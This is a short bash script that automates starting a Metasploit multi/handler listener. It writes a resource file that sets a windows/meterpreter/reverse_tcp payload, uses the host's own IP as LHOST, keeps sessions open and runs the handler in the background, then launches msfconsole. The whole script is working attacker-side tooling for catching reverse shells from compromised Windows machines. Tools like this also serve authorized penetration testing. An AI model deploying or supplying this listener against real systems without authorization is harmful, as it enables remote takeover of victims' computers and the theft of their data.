#!/bin/bash
# Quick script to set up a metasploit multi handler
IP=`ifconfig | grep 'inet addr' | grep -v '127.0.0.1' | cut -d: -f2 | awk '{print $1}'`
cd /usr/share/metasploit-framework/scripts/meterpreter
if [ -f listener.rc ];
then
rm listener.rc
fi
touch listener.rc
echo "use exploit/multi/handler" >> listener.rc
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> listener.rc
echo "set LHOST" $IP >> listener.rc
echo "set ExitOnSession false" >> listener.rc
echo "exploit -j -z" >>listener.rc
msfconsole -r listener.rc
